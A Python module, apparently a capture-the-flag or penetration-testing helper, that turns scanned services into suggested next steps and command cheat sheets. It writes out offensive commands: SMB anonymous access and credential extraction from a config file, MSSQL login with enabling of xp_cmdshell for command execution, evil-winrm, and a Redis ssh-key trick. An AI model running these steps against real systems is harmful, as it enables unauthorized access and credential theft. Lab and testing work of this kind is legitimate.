from __future__ import annotations
from typing import List, Dict, Tuple, Optional

Service = Dict[str, object]


def _svc_name(s: Service) -> str:
    port = s.get("port")
    proto = s.get("proto", "tcp")
    name = s.get("service", "")
    return f"{port}/{proto} {name}".strip()


def next_steps_from_services(
    services: List[Service],
    verbose: bool = True,
    target: Optional[str] = None,
    creds: Optional[List[Dict[str, str]]] = None,
) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    if not services:
        return out

    # Generic first steps
    generic = [
        "Run full TCP scan if not already: nmap -p- -sC -sV -oA full <target>",
        "If web found, try: whatweb, feroxbuster or ffuf for directories",
        "If creds found anywhere, try SSH/RDP/WinRM reuse",
    ]
    if verbose:
        out.append(("General", "\n".join(generic)))

    # Prefer a credential relevant to a service if provided
    cred_user: Optional[str] = None
    cred_pass: Optional[str] = None
    if creds:
        # try to find service-specific first
        svc_names = [str(x.get("service", "")).lower() for x in services]
        pick = None
        for c in creds:
            sv = str(c.get("service", "")).lower()
            if sv and any(sv in n for n in svc_names):
                pick = c
                break
        if pick is None:
            pick = creds[0]
        cred_user = str(pick.get("user")) if pick.get("user") else None
        cred_pass = str(pick.get("pass")) if pick.get("pass") else None

    for s in services:
        port = int(s.get("port", 0) or 0)
        name = str(s.get("service", "")).lower()
        title = _svc_name(s)
        steps: List[str] = []

        if port in (80, 8080, 8000, 8888) or "http" in name:
            steps += [
                "HTTP enum: whatweb http://<target>:<port>",
                "Dir brute: ffuf -u http://<target>:<port>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ic",
                "Tech stack IDs, robots.txt, /.git/, backups, upload forms",
            ]
        if port == 443 or "https" in name:
            steps += [
                "HTTPS: whatweb https://<target>:443",
                "Check TLS and vhosts; try httpx -title -status -ip -mc 200,301,302 https://<target>",
            ]
        if port == 22 or "ssh" in name:
            steps += [
                "Try default/weak creds if hints: ssh <user>@<target>",
                "Key-based attempts if id_rsa found; check allowroot, banner",
            ]
        if port in (139, 445) or "smb" in name:
            steps += [
                "List shares: smbclient -L //<target> -N",
                "Anonymous access (try backups): smbclient //<target>/backups -N",
                "Enum: nxc smb <target> -u '' -p '' --shares",
            ]
            if target:
                steps += [
                    f"Example: smbclient //{target}/backups -N -c 'ls; get prod.dtsConfig'",
                    "Extract creds from prod.dtsConfig (ConnectionString): grep -E 'User ID|Password' prod.dtsConfig",
                ]
        if port == 21 or "ftp" in name:
            steps += [
                "Anonymous login: ftp <target> (user: anonymous)",
                "Mirror files, look for creds/scripts",
            ]
        if port == 25 or "smtp" in name:
            steps += [
                "Enum users: smtp-user-enum -M VRFY -U users.txt -t <target>",
            ]
        if port == 3306 or "mysql" in name:
            steps += [
                "Try creds if found: mysql -h <target> -u <user> -p",
                "File read via LOAD_FILE if perms; check version, users",
            ]
        if port == 5432 or "postgres" in name:
            steps += [
                "psql -h <target> -U <user> -W; enumerate dbs, creds",
            ]
        if port == 1433 or "mssql" in name:
            steps += [
                "mssqlclient.py: authenticate and enable xp_cmdshell, then execute",
            ]
            if target and cred_user and cred_pass:
                steps += [
                    f"Login: mssqlclient.py {cred_user}:{cred_pass}@{target} -windows-auth",
                    "Enable xp_cmdshell: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                    "Test: EXEC xp_cmdshell 'whoami';",
                    "List users: EXEC xp_cmdshell 'dir C:\\Users';",
                    "Read user flag (adjust user folder): EXEC xp_cmdshell 'type C:\\Users\\<user>\\Desktop\\user.txt';",
                ]
            elif target:
                steps += [
                    f"Login (prompt for pass): mssqlclient.py <user>@{target} -windows-auth",
                    "Then enable xp_cmdshell and execute commands as above",
                ]
        if port == 6379 or "redis" in name:
            steps += [
                "redis-cli -h <target> info; check unauth, write ssh-key trick",
            ]
        if port == 111 or port == 2049 or "nfs" in name:
            steps += [
                "Showmount: showmount -e <target>",
                "Mount rw export: sudo mount -t nfs <target>:/export /mnt/nfs",
            ]
        if port == 5985 or "winrm" in name:
            steps += [
                "evil-winrm -i <target> -u <user> -p <pass>",
            ]
        if port == 3389 or "rdp" in name:
            steps += [
                "xfreerdp /v:<target> /u:<user> /p:<pass> /cert:ignore",
            ]

        if steps:
            out.append((title, "\n".join(steps)))

    return out


def cheatsheets_for_services(services: List[Service]) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    if not services:
        return out

    cheats: Dict[str, List[str]] = {}

    for s in services:
        port = int(s.get("port", 0) or 0)
        name = str(s.get("service", "")).lower()
        key = _svc_name(s)
        cmds: List[str] = []
        if port in (80, 8080) or "http" in name:
            cmds += [
                "whatweb http://<target>:<port>",
                "ffuf -u http://<target>:<port>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ic",
                "gobuster dir -u http://<target>:<port>/ -w /usr/share/wordlists/dirb/common.txt -k",
            ]
        if port == 22 or "ssh" in name:
            cmds += [
                "ssh <user>@<target> -p <port>",
                "ssh -i id_rsa <user>@<target>",
            ]
        if port in (139, 445) or "smb" in name:
            cmds += [
                "smbclient -L //<target> -N",
                "smbclient //<target>/share -N",
                "nxc smb <target> -u '' -p '' --shares",
            ]
        if port == 21 or "ftp" in name:
            cmds += [
                "ftp <target>",
                "lftp -u anonymous,anonymous <target>",
            ]
        if port == 3306 or "mysql" in name:
            cmds += [
                "mysql -h <target> -P <port> -u <user> -p",
            ]
        if port == 5432 or "postgres" in name:
            cmds += [
                "psql -h <target> -p <port> -U <user> -W",
            ]
        if port == 6379 or "redis" in name:
            cmds += [
                "redis-cli -h <target> -p <port> info",
            ]
        if port == 111 or port == 2049 or "nfs" in name:
            cmds += [
                "showmount -e <target>",
                "sudo mount -t nfs <target>:/export /mnt/nfs",
            ]
        if port == 5985 or "winrm" in name:
            cmds += [
                "evil-winrm -i <target> -u <user> -p <pass>",
            ]
        if port == 3389 or "rdp" in name:
            cmds += [
                "xfreerdp /v:<target> /u:<user> /p:<pass> /cert:ignore",
            ]

        if cmds:
            cheats[key] = cmds

    for k, v in cheats.items():
        out.append((k, "\n".join(v)))

    return out
